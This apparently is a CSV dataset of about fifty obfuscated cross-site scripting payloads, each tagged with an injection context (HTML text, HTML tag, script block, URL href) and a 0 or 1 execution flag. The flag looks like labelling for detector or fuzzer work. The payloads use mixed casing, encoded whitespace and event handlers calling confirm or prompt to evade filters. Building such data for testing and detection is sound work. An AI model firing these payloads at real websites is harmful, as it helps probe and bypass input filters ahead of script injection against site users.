payload,context,exec,combined
<d3V%0aOnMOuSEovER+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <d3V%0aOnMOuSEovER+=+confirm()>v3dm0s
<dEtaIlS%0aONpoiNtEreNter+=+[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <dEtaIlS%0aONpoiNtEreNter+=+[8].find(confirm)//
<d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s
<svg><script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>prompt(1)</script>
<a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s
<hTML%09OnmOusEoVER%09=%09[8].find(confirm)>,html_text,0,CONTEXT_html_text <hTML%09OnmOusEoVER%09=%09[8].find(confirm)>
"<hTmL%09OnPoIntEreNtEr%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <hTmL%09OnPoIntEreNtEr%0d=%0da=prompt,a()//"
<deTaiLS%0donpOINteReNteR%0a=%0a(confirm)()>,html_text,0,CONTEXT_html_text <deTaiLS%0donpOINteReNteR%0a=%0a(confirm)()>
<htmL%09onPOiNTERENTER%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <htmL%09onPOiNTERENTER%09=%09confirm()%0dx//
<a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s
<D3V%0aonMousEOvER+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3V%0aonMousEOvER+=+confirm()>v3dm0s
<A/+/ONMouSEOver%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONMouSEOver%0d=%0d(prompt)``>v3dm0s
<HtmL%0aonPOiNterentER%0a=%0a(confirm)()//,html_tag,0,CONTEXT_html_tag <HtmL%0aonPOiNterentER%0a=%0a(confirm)()//
<a/+/OnmouSeOVer%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnmouSeOVer%0a=%0a(confirm)()>v3dm0s
<D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<hTml%0aONPoIntEReNTER%09=%09[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <hTml%0aONPoIntEReNTER%09=%09[8].find(confirm)%0dx>
<d3V/+/onMOUSeoVEr%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onMOUSeoVEr%0a=%0a[8].find(confirm)>v3dm0s
<d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s
<a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<HTML%0aOnpOInTEreNteR+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <HTML%0aOnpOInTEreNteR+=+confirm()%0dx>
<deTaiLs%0donPointereNteR%0d=%0d(prompt)``//,html_tag,0,CONTEXT_html_tag <deTaiLs%0donPointereNteR%0d=%0d(prompt)``//
<D3V%0dOnpoINtERENTeR%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0dOnpoINtERENTeR%0a=%0a(confirm)()>v3dm0s
<A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s
<Html/+/OnpoINteREnTEr%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <Html/+/OnpoINteREnTEr%09=%09confirm()//
<A/+/oNMouseOVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNMouseOVEr%0d=%0dconfirm()>v3dm0s
<A%0aONMouseOVEr+=+confirm()>v3dm0s,script_block,0,CONTEXT_script_block <A%0aONMouseOVEr+=+confirm()>v3dm0s
<dEtAILs/+/OnToGgLE+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <dEtAILs/+/OnToGgLE+=+confirm()%0dx>
<d3v/+/onpOinTeREntEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/onpOinTeREntEr%0d=%0d(prompt)``%0dx>v3dm0s
<DEtaiLS%0dOntOgGLE+=+[8].find(confirm)>,html_text,0,CONTEXT_html_text <DEtaiLS%0dOntOgGLE+=+[8].find(confirm)>
<a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s
<deTAILs/+/OnpoINTErEntER+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <deTAILs/+/OnpoINTErEntER+=+(confirm)()%0dx>
<a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s
<deTAilS%09oNpOinteReNTeR%09=%09confirm()>,html_text,0,CONTEXT_html_text <deTAilS%09oNpOinteReNTeR%09=%09confirm()>
<D3v%0donpOInTErEnteR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0donpOInTErEnteR%09=%09confirm()%0dx>v3dm0s
"<D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s"
<A/+/ONmOUseovEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONmOUseovEr%09=%09confirm()%0dx>v3dm0s
<A%0doNpOINTEReNter%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0doNpOINTEReNter%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a%09OnpointeRenTER%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnpointeRenTER%0d=%0d(prompt)``%0dx>v3dm0s
<a%0aoNPoiNteREnter%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNPoiNteREnter%0a=%0a[8].find(confirm)>v3dm0s
"<HtmL%09oNMOUSeoVer%0d=%0da=prompt,a()//",html_text,0,"CONTEXT_html_text <HtmL%09oNMOUSeoVer%0d=%0da=prompt,a()//"
<DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>
<a%0aOnPOInTeReNtEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aOnPOInTeReNtEr%0d=%0dconfirm()>v3dm0s
<a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//,html_text,0,CONTEXT_html_text <hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//
javascript:alert(document.domain),url_href,1,CONTEXT_url_href javascript:alert(document.domain)
<a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s
"<deTailS%09oNTogGLe%0d=%0da=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <deTailS%09oNTogGLe%0d=%0da=prompt,a()%0dx//"
<d3v%09oNPOINtErEnTeR+=+(confirm)()>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v%09oNPOINtErEnTeR+=+(confirm)()>v3dm0s
<D3v/+/onPOinTEreNtER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/onPOinTEreNtER%0d=%0d[8].find(confirm)%0dx>v3dm0s
